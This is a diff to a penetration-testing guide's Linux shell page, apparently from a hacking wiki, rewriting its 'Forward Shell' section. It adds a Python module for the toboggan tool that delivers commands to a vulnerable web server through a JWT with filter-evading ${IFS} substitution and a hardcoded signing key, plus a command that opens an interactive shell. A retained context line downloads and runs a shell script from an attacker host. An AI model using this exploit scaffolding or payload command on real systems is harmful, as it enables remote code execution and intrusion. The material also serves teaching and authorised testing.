@@ -65,9 +65,44 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 
 ## Forward Shell
 
-If you encounter an **RCE vulnerability** within a Linux-based web application, there might be instances where **obtaining a reverse shell becomes difficult** due to the presence of Iptables rules or other filters. In such scenarios, consider creating a PTY shell within the compromised system using pipes.
+When dealing with a **Remote Code Execution (RCE)** vulnerability within a Linux-based web application, achieving a reverse shell might be obstructed by network defenses like iptables rules or intricate packet filtering mechanisms. In such constrained environments, an alternative approach involves establishing a PTY (Pseudo Terminal) shell to interact with the compromised system more effectively.
 
-You can find the code in [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)
+A recommended tool for this purpose is [toboggan](https://github.com/n3rada/toboggan.git), which simplifies interaction with the target environment.
+
+To utilize toboggan effectively, create a Python module tailored to the RCE context of your target system. For example, a module named `nix.py` could be structured as follows:
+```python3
+import jwt
+import httpx
+
+def execute(command: str, timeout: float = None) -> str:
+    # Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
+    token = jwt.encode(
+        {"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
+    )
+
+    response = httpx.get(
+        url="https://vulnerable.io:3200",
+        headers={"Authorization": f"Bearer {token}"},
+        timeout=timeout,
+        # ||BURP||
+        verify=False,
+    )
+
+    # Check if the request was successful
+    response.raise_for_status()
+
+    return response.text
+```
+
+And then, you can run:
+```shell
+toboggan -m nix.py -i
+```
+
+To directly leverage an interractive shell. You can add `-b` for Burpsuite integration and remove the `-i` for a more basic rce wrapper.
+
+
+Another possibility consist using the `IppSec` forward shell implementation [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).
 
 You just need to modify:
 
